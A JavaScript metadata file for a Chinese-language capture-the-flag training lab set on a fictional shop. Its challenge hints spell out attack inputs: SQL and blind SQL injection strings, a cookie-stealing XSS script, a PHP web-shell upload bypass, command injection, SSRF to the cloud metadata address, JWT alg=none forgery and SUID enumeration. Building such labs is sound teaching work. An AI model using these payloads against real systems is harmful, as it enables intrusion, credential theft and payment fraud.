'use strict';
/**
 * 关卡元数据（只描述，不含答案）
 * 每关通过 flag 值校验，flag 在首次启动时随机生成并写入 data/state.json
 */

const CATEGORIES = [
  { id: 'web', name: 'Web 漏洞', color: '#38bdf8', desc: 'OWASP 常见注入与执行类漏洞' },
  { id: 'biz', name: '业务逻辑', color: '#a78bfa', desc: '越权、支付、验证码、优惠券' },
  { id: 'host', name: '主机渗透', color: '#fbbf24', desc: '信息收集、弱口令、权限提升' },
  { id: 'final', name: '综合挑战', color: '#f87171', desc: '集齐全部 flag 解锁' }
];

const CHALLENGES = [
  {
    id: 'web-sqli',
    cat: 'web',
    title: '搜索框里的 SQL 注入',
    level: '简单',
    points: 200,
    entry: { label: '打开商品搜索', path: '/lab/search?q=摄像头' },
    summary: '云图商城的商品搜索把用户输入直接拼进了 SQL 语句，尝试读取被隐藏的内部商品。',
    goal: '通过注入让查询条件恒真，拿到被 hidden=0 过滤掉的内部商品，其描述中带有 flag。',
    hints: [
      '搜索关键字会原样出现在 SQL 的 LIKE 条件里。',
      'SQL 注释符可以截断后面追加的 AND hidden = 0。',
      "试试输入：' OR 1=1 -- （注意结尾空格）"
    ]
  },
  {
    id: 'web-xss',
    cat: 'web',
    title: '留言板的存储型 XSS',
    level: '中等',
    points: 300,
    entry: { label: '打开留言板', path: '/lab/guestbook' },
    summary: '产品留言板对内容不做过滤直接渲染，平台管理员会定期浏览新留言，其登录 Cookie 中含有 flag。',
    goal: '构造可执行的脚本载荷，让管理员 Bot 触发并把 Cookie 外带到回连平台。',
    hints: [
      '留言内容在页面上是原样输出的，没有被转义。',
      '管理员 Bot 在留言后会自动访问一次该页面。',
      "外带地址：<script>fetch('/lab/collect?c='+document.cookie)</script>",
      '也可以试试 <img src=x onerror=...> 绕过简单的过滤。'
    ]
  },
  {
    id: 'web-upload',
    cat: 'web',
    title: '头像上传绕过',
    level: '中等',
    points: 250,
    entry: { label: '打开上传中心', path: '/lab/upload' },
    summary: '个人中心头像上传：前端限制只能选图片，后端只校验 Content-Type。上传的脚本文件会被当作可执行文件运行。',
    goal: '绕过限制上传一个 .php 脚本，访问它以获得 flag。',
    hints: [
      '前端的 accept 与扩展名校验，抓包改文件名即可绕过。',
      '后端只看 Content-Type 是否以 image/ 开头。',
      '把文件名的 Content-Type 改成 image/png，文件名保留 shell.php，再访问 /uploads/shell.php。'
    ]
  },
  {
    id: 'web-cmdi',
    cat: 'web',
    title: 'Ping 检测工具的命令注入',
    level: '中等',
    points: 300,
    entry: { label: '打运维工具', path: '/lab/tools' },
    summary: '运维面板提供一个在线 ping 检测，参数直接拼接进系统命令执行。当前进程身份为 www-data。',
    goal: '拼接命令读取根目录下的 /flag 文件。',
    hints: [
      '试试 127.0.0.1;id 看看身份。',
      '分号、管道符、&& 都能拼接多条命令。',
      '最终读到 /flag。'
    ]
  },
  {
    id: 'web-ssrf',
    cat: 'web',
    title: '图片代理的 SSRF',
    level: '较难',
    points: 350,
    entry: { label: '打开图片代理', path: '/lab/proxy' },
    summary: '为规避跨域，图片代理由服务端代为请求远端 URL。服务端未对内网地址做任何限制。',
    goal: '让服务端去请求本机的内部接口，拿到只有内网才能访问的 flag。',
    hints: [
      '内部服务与靶场同端口：http://127.0.0.1:7788/internal/flag',
      '也可以探测云主机元数据服务 http://169.254.169.254/latest/meta-data/',
      '外网地址会被沙箱拦截，别往外面打。'
    ]
  },

  {
    id: 'biz-idor',
    cat: 'biz',
    title: '订单详情的越权访问',
    level: '简单',
    points: 200,
    entry: { label: '打开订单中心', path: '/lab/orders' },
    summary: '订单查询接口 /api/lab/orders/:id 只校验了登录态，没有校验订单归属。',
    goal: '遍历订单号，读到管理员订单备注里的 flag。',
    hints: [
      '先用演示账号 alice / 123456 登录。',
      '订单号从 1001 开始递增，接口不校验归属。',
      '把页面上的订单详情接口地址直接改 id 请求即可。'
    ]
  },
  {
    id: 'biz-price',
    cat: 'biz',
    title: '支付金额可篡改',
    level: '简单',
    points: 250,
    entry: { label: '打开收银台', path: '/lab/checkout' },
    summary: '下单接口的支付金额由前端提交，服务端直接信任，未与商品价格二次比对。',
    goal: '以远低于标价（或任意金额）完成企业版授权订单。',
    hints: [
      '商品标价 19800，抓包看 pay 接口的请求体。',
      '把 amount 改成 1 甚至 0.01 再提交。',
      '服务端只要认为支付成功就会返回订单凭据。'
    ]
  },
  {
    id: 'biz-sms',
    cat: 'biz',
    title: '短信验证码未校验',
    level: '中等',
    points: 200,
    entry: { label: '打开登录页', path: '/lab/login' },
    summary: '后台支持手机验证码登录。发码接口把验证码直接放在响应里返回，且校验逻辑支持空值通过。',
    goal: '以管理员手机号登录后台，读取后台首页的 flag。',
    hints: [
      '管理员手机号：13800000001',
      '点「发送验证码」后看响应 JSON，里面有明文验证码。',
      '也可以尝试直接提交空验证码。'
    ]
  },
  {
    id: 'biz-coupon',
    cat: 'biz',
    title: '优惠券叠加逻辑漏洞',
    level: '中等',
    points: 300,
    entry: { label: '打开购物车', path: '/lab/cart' },
    summary: '结算时优惠券的「使用张数」由前端提交，服务端未做去重与上限校验，抵扣可以无限叠加。',
    goal: '让应付金额被抵扣到 0 或负数，完成 0 元支付。',
    hints: [
      '先把企业版授权加入购物车。',
      '优惠券 NEW100 每张抵 100 元，请求体里的 times 由你决定。',
      'times 传 500 试试。'
    ]
  },

  {
    id: 'host-leak',
    cat: 'host',
    title: 'robots.txt 与备份文件泄露',
    level: '简单',
    points: 150,
    entry: { label: '访问 /robots.txt', path: '/robots.txt' },
    summary: '生产站点把备份目录写进了 robots.txt，目录下还留着未清理的数据库导出文件。',
    goal: '找到备份的 SQL 文件，读出其中的 flag。',
    hints: [
      '先看 /robots.txt 的 Disallow 项。',
      '备份目录没有做访问控制与目录索引保护。',
      '备份文件里还有一台主机的账号口令，后面要用。'
    ]
  },
  {
    id: 'host-weakpwd',
    cat: 'host',
    title: '弱口令登录主机',
    level: '中等',
    points: 200,
    entry: { label: '打开 SSH 门户', path: '/lab/ssh' },
    summary: '从备份文件中拿到了运维账号 ops 的口令，尝试登录这台主机的 Web SSH 门户。',
    goal: '登录到 ops 账号，读取 /home/ops/flag_user.txt。',
    hints: [
      'db.sql 的 sys_user 表里存的是明文口令。',
      '账号 ops，口令与备份中一致。',
      '登录后在终端里执行 cat /home/ops/flag_user.txt。'
    ]
  },
  {
    id: 'host-privesc',
    cat: 'host',
    title: 'SUID 提权到 root',
    level: '较难',
    points: 400,
    entry: { label: '打开 SSH 门户', path: '/lab/ssh' },
    summary: 'ops 只是普通用户，但这台机器上有一个以 root 身份运行的运维备份工具。',
    goal: '找到 SUID 程序并利用它读取 /root/flag.txt。',
    hints: [
      '枚举 SUID：find / -perm -4000 2>/dev/null',
      '可疑文件：/usr/local/bin/backup',
      '它的 --restore 参数会以 root 身份读取备份清单。'
    ]
  },

  {
    id: 'web-ssti',
    cat: 'web',
    title: '报表标题的模板注入',
    level: '较难',
    points: 300,
    entry: { label: '打开报表中心', path: '/lab/report?name=月度销售报表' },
    summary: '报表中心支持在标题里写 {{变量}}，服务端用模板引擎渲染这段用户输入，于是输入里的表达式被真的执行了。',
    goal: '让模板执行表达式，把渲染上下文里的 flag 取出来。',
    hints: [
      '先试 {{7*7}}，页面输出 49 就说明表达式被执行了。',
      '上下文里有 flag 变量，直接取：{{flag}}',
      '工具党可以用 tplmap，或者用 ffuf 批量 fuzz 常见 payload：{{7*7}}、${7*7}、<%= 7*7 %>'
    ]
  },
  {
    id: 'web-blind',
    cat: 'web',
    title: '无回显的布尔盲注',
    level: '较难',
    points: 350,
    entry: { label: '打开盲注接口', path: '/lab/search/blind?q=摄像头' },
    summary: '运维给搜索接口加了"加固版"：不返回任何商品数据，出错也只回一句查询失败。你只能看到命中几条。',
    goal: '用布尔盲注逐字符取出 secrets 表里 id=3 那条记录的 flag。',
    hints: [
      '页面只回「命中 N 条」，但 N 会随注入条件的真假变化。',
      '先摸基准：q=摄像头 与 q=摄像头%\' AND 1=2 --  的 N 不一样。',
      '子查询 + SUBSTR 逐位判断：摄像头%\' AND SUBSTR((SELECT flag FROM secrets WHERE id=3),1,5)=\'flag{\' -- ',
      'ASCII 区间比较更快：ASCII(SUBSTR(...,1,1))>100；用 ffuf 或 Burp Intruder 逐位爆破。'
    ]
  },

  {
    id: 'biz-jwt',
    cat: 'biz',
    title: 'JWT 令牌伪造',
    level: '中等',
    points: 350,
    entry: { label: '打开令牌调试台', path: '/lab/jwt' },
    summary: '接口用 JWT 做鉴权：HS256 签名，但密钥很短；服务端还接受 alg=none 的令牌且不校验签名。',
    goal: '伪造一个 role=admin 的令牌，通过鉴权拿到 flag。',
    hints: [
      '先登录拿一个合法 token，用 jwt.io 或 jwt_tool 看结构。',
      '两条路：把 alg 改成 none 并把签名留空；或者爆破 HS256 密钥。',
      '密钥就是公司名的小写：cloudpix（jwt_tool -C -d wordlist 可跑出来）。'
    ]
  },

  {
    id: 'final',
    cat: 'final',
    title: '终极 Flag',
    level: '终极',
    points: 500,
    entry: { label: '查看解锁条件', path: '/lab/final' },
    summary: '所有关卡的 flag 全部提交后，终局关卡自动解锁，flag 由全部已解 flag 派生。',
    goal: '完成全部关卡，提交终极 flag。',
    hints: ['终极 flag 在 /lab/final 页面可见，但只有集齐全部 flag 才会显示。'],
    requiresAll: true
  }
];

const BY_ID = Object.fromEntries(CHALLENGES.map(c => [c.id, c]));

module.exports = { CHALLENGES, CATEGORIES, BY_ID };
